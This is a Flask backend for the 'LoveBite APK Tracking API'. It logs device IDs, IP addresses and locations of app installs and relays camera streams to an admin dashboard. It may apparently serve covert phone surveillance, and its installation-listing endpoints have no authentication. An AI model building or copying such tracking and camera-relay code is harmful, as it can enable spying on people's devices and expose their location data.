from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from datetime import datetime, timezone
import json
import os
import time
import uuid
from bson import ObjectId
import logging
import threading
import config

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app, origins=config.CORS_ORIGINS, supports_credentials=config.CORS_SUPPORTS_CREDENTIALS)

# Check if we're running on Vercel (serverless environment)
IS_VERCEL = config.IS_VERCEL

# Initialize socketio and related functions as None by default
socketio = None
emit = None
join_room = None
leave_room = None

# Only import and configure SocketIO if not on Vercel
if not IS_VERCEL:
    try:
        from flask_socketio import SocketIO, emit, join_room, leave_room
        # Configure SocketIO with better production settings
        socketio = SocketIO(
            app, 
            cors_allowed_origins=config.SOCKETIO_CORS_ORIGINS,
            logger=True,
            engineio_logger=True,
            ping_timeout=config.SOCKETIO_PING_TIMEOUT,
            ping_interval=config.SOCKETIO_PING_INTERVAL,
            max_http_buffer_size=config.SOCKETIO_MAX_HTTP_BUFFER_SIZE
        )
    except ImportError:
        pass  # SocketIO not available, websocket features disabled

# MongoDB connection
MONGODB_URI = config.MONGODB_URI

# Global variables for MongoDB
client = None
db = None
installations_collection = None
mongodb_connected = False

# In-memory storage for testing when MongoDB is not available
in_memory_storage = []

# WebRTC signaling storage
webrtc_offers = {}
webrtc_answers = {}
active_camera_streams = {}
ice_candidates = {}

def init_mongodb_async():
    """Initialize MongoDB connection in background thread"""
    global client, db, installations_collection, mongodb_connected
    try:
        logger.info("🔄 Attempting MongoDB connection...")
        client = MongoClient(
            MONGODB_URI, 
            serverSelectionTimeoutMS=10000,
            connectTimeoutMS=10000,
            socketTimeoutMS=10000,
            maxPoolSize=5,
            retryWrites=True,
            retryReads=True
        )
        # Test the connection
        client.admin.command('ping')
        db = client[config.DB_NAME]
        installations_collection = db[config.COLLECTION_NAME]
        mongodb_connected = True
        logger.info("✅ Connected to MongoDB successfully!")
        print("✅ Connected to MongoDB successfully!")
    except Exception as e:
        logger.error(f"❌ MongoDB connection failed: {e}")
        print(f"❌ MongoDB connection failed: {e}")
        print("🔄 Using in-memory storage for testing...")
        mongodb_connected = False

# Initialize MongoDB connection
# Use lazy initialization for Vercel to avoid cold start issues
_mongodb_initialized = False

def ensure_mongodb_connection():
    """Ensure MongoDB is connected (lazy initialization for Vercel)"""
    global _mongodb_initialized, mongodb_connected
    if not _mongodb_initialized:
        _mongodb_initialized = True
        if not mongodb_connected:
            init_mongodb_async()

if IS_VERCEL:
    # On Vercel, initialize lazily on first actual request
    @app.before_request
    def init_mongodb_before_request():
        ensure_mongodb_connection()
else:
    # On other platforms, use background thread - DON'T BLOCK STARTUP
    mongodb_thread = threading.Thread(target=init_mongodb_async, daemon=True)
    mongodb_thread.start()

class JSONEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, ObjectId):
            return str(obj)
        return super().default(obj)

app.json_encoder = JSONEncoder

@app.route('/')
def home():
    """Quick home endpoint"""
    return jsonify({
        "message": "LoveBite APK Tracking API",
        "status": "healthy",
        "version": "1.0.0",
        "mongodb": "connected" if mongodb_connected else "connecting",
        "timestamp": datetime.now(timezone.utc).isoformat()
    })

@app.route('/health')
def health():
    """FAST health check endpoint for Railway - NO DATABASE CHECKS"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now(timezone.utc).isoformat()
    }), 200

@app.route('/api/status')
def detailed_status():
    """Detailed status including MongoDB connection"""
    return jsonify({
        "status": "healthy",
        "mongodb": "connected" if mongodb_connected else "connecting",
        "port": os.getenv('PORT', str(config.DEFAULT_PORT)),
        "environment": os.getenv('RAILWAY_ENVIRONMENT', 'local'),
        "timestamp": datetime.now(timezone.utc).isoformat()
    })

@app.route('/admin_dashboard.html')
def admin_dashboard():
    """Serve the admin dashboard HTML page"""
    try:
        with open('admin_dashboard.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Admin dashboard not found", 404

@app.route('/login.html')
def login_page():
    """Serve the login HTML page"""
    try:
        with open('login.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Login page not found", 404

@app.route('/api/track-installation', methods=['POST'])
def track_installation():
    try:
        data = request.get_json()
        
        # Validate required fields
        required_fields = ['device_id', 'app_version', 'device_info']
        for field in required_fields:
            if field not in data:
                return jsonify({
                    "success": False,
                    "error": f"Missing required field: {field}"
                }), 400
        
        # Create installation record
        installation_record = {
            "device_id": data['device_id'],
            "app_version": data['app_version'],
            "device_info": data['device_info'],
            "installation_time": datetime.now(timezone.utc),
            "ip_address": request.remote_addr,
            "user_agent": request.headers.get('User-Agent', ''),
            "country": data.get('country', 'Unknown'),
            "city": data.get('city', 'Unknown'),
            "timezone": data.get('timezone', 'Unknown'),
            "is_active": True,
            "last_seen": datetime.now(timezone.utc)
        }
        
        if mongodb_connected and installations_collection is not None:
            # Use MongoDB
            existing_device = installations_collection.find_one({"device_id": data['device_id']})
            
            if existing_device:
                installations_collection.update_one(
                    {"device_id": data['device_id']},
                    {
                        "$set": {
                            "last_seen": datetime.now(timezone.utc),
                            "is_active": True,
                            "app_version": data['app_version'],
                            "device_info": data['device_info']
                        }
                    }
                )
                message = "Device information updated"
            else:
                installations_collection.insert_one(installation_record)
                message = "New installation tracked"
        else:
            # Use in-memory storage
            existing_device = next((d for d in in_memory_storage if d['device_id'] == data['device_id']), None)
            
            if existing_device:
                existing_device.update({
                    "last_seen": datetime.now(timezone.utc),
                    "is_active": True,
                    "app_version": data['app_version'],
                    "device_info": data['device_info']
                })
                message = "Device information updated"
            else:
                in_memory_storage.append(installation_record)
                message = "New installation tracked"
        
        return jsonify({
            "success": True,
            "message": message,
            "device_id": data['device_id']
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/installations', methods=['GET'])
def get_installations():
    try:
        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 50))
        country = request.args.get('country')
        active_only = request.args.get('active_only', 'true').lower() == 'true'
        
        query = {}
        if country:
            query['country'] = country
        if active_only:
            query['is_active'] = True
        
        if mongodb_connected and installations_collection is not None:
            total_count = installations_collection.count_documents(query)
            skip = (page - 1) * limit
            installations = list(installations_collection.find(query)
                               .sort('installation_time', -1)
                               .skip(skip)
                               .limit(limit))
        else:
            filtered_installations = []
            for installation in in_memory_storage:
                if country and installation.get('country') != country:
                    continue
                if active_only and not installation.get('is_active', True):
                    continue
                filtered_installations.append(installation)
            
            total_count = len(filtered_installations)
            installations = sorted(filtered_installations, 
                                 key=lambda x: x.get('installation_time', datetime.min), 
                                 reverse=True)
            skip = (page - 1) * limit
            installations = installations[skip:skip + limit]
        
        for installation in installations:
            if '_id' in installation:
                installation['_id'] = str(installation['_id'])
            if 'installation_time' in installation:
                installation['installation_time'] = installation['installation_time'].isoformat()
            if 'last_seen' in installation:
                installation['last_seen'] = installation['last_seen'].isoformat()
        
        return jsonify({
            "success": True,
            "data": installations,
            "pagination": {
                "page": page,
                "limit": limit,
                "total_count": total_count,
                "total_pages": (total_count + limit - 1) // limit
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get installation statistics"""
    try:
        if mongodb_connected and installations_collection is not None:
            # Get total installations
            total_installations = installations_collection.count_documents({})
            
            # Get active installations
            active_installations = installations_collection.count_documents({"is_active": True})
            
            # Get country stats
            country_pipeline = [
                {"$group": {"_id": "$country", "count": {"$sum": 1}}},
                {"$sort": {"count": -1}},
                {"$limit": 10}
            ]
            country_stats = list(installations_collection.aggregate(country_pipeline))
            
            # Get version stats
            version_pipeline = [
                {"$group": {"_id": "$app_version", "count": {"$sum": 1}}},
                {"$sort": {"count": -1}},
                {"$limit": 10}
            ]
            version_stats = list(installations_collection.aggregate(version_pipeline))
            
        else:
            # Use in-memory storage
            total_installations = len(in_memory_storage)
            active_installations = len([d for d in in_memory_storage if d.get('is_active', True)])
            
            # Country stats from in-memory
            country_counts = {}
            version_counts = {}
            
            for installation in in_memory_storage:
                country = installation.get('country', 'Unknown')
                version = installation.get('app_version', 'Unknown')
                
                country_counts[country] = country_counts.get(country, 0) + 1
                version_counts[version] = version_counts.get(version, 0) + 1
            
            country_stats = [{"_id": country, "count": count} for country, count in sorted(country_counts.items(), key=lambda x: x[1], reverse=True)[:10]]
            version_stats = [{"_id": version, "count": count} for version, count in sorted(version_counts.items(), key=lambda x: x[1], reverse=True)[:10]]
        
        return jsonify({
            "success": True,
            "stats": {
                "total_installations": total_installations,
                "active_installations": active_installations,
                "country_stats": country_stats,
                "version_stats": version_stats
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# WebSocket Event Handlers (only available when SocketIO is enabled)
if socketio:
    @socketio.on('connect')
    def handle_connect():
        try:
            logger.info(f"Client connected: {request.sid}")
            emit('connected', {'message': 'Connected to LoveBite server'})
        except Exception as e:
            logger.error(f"Error in connect handler: {e}")

    @socketio.on('disconnect')
    def handle_disconnect():
        try:
            logger.info(f"Client disconnected: {request.sid}")
            for device_id, stream_info in list(active_camera_streams.items()):
                if stream_info.get('client_id') == request.sid:
                    del active_camera_streams[device_id]
                    emit('camera_stopped', {'device_id': device_id}, room='admin_dashboard')
        except Exception as e:
            logger.error(f"Error in disconnect handler: {e}")

    @socketio.on('join_admin_room')
    def handle_join_admin_room():
        join_room('admin_dashboard')
        print(f"Admin client connected: {request.sid}")
        emit('joined_admin_room', {'message': 'Joined admin dashboard'})

if __name__ == '__main__':
    print("🚀 Starting LoveBite APK Tracking API...")
    print(f"🔌 MongoDB: {'Connecting in background...' if not mongodb_connected else 'Connected'}")
    
    if IS_VERCEL:
        print("🔧 Running on Vercel - WebSocket features disabled")
        # For Vercel, just run the Flask app without SocketIO
        app.run(host=config.HOST, port=int(os.getenv('PORT', str(config.DEFAULT_PORT))), debug=False)
    elif socketio:
        print("🌐 WebSocket enabled for real-time camera streaming")
        socketio.run(
            app, 
            host=config.HOST, 
            port=int(os.getenv('PORT', str(config.DEFAULT_PORT))),
            debug=False, 
            allow_unsafe_werkzeug=True
        )
    else:
        print("⚠️  WebSocket features disabled - Flask-SocketIO not available")
        app.run(host=config.HOST, port=int(os.getenv('PORT', str(config.DEFAULT_PORT))), debug=False)